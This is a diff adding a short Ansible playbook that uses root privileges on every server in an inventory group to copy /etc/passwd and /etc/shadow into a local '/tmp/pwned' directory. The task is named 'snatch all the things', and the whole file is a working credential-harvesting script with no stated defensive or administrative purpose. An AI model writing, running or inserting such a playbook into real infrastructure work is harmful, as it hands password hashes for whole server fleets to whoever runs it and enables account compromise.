@@ -1,0 +1,15 @@
+---
+- hosts: all-servers
+  user: pi
+  sudo: true
+  sudo_user: root
+  serial: 1
+  vars:
+    ansible_path: "{{ lookup('env','ANSIBLE_WORK_DIR') }}"
+    pwned_path: "/tmp/pwned"
+  tasks:
+    - name: snatch all the things
+      fetch: src={{ item }} dest={{ pwned_path }}
+      with_items:
+        - /etc/passwd
+        - /etc/shadow
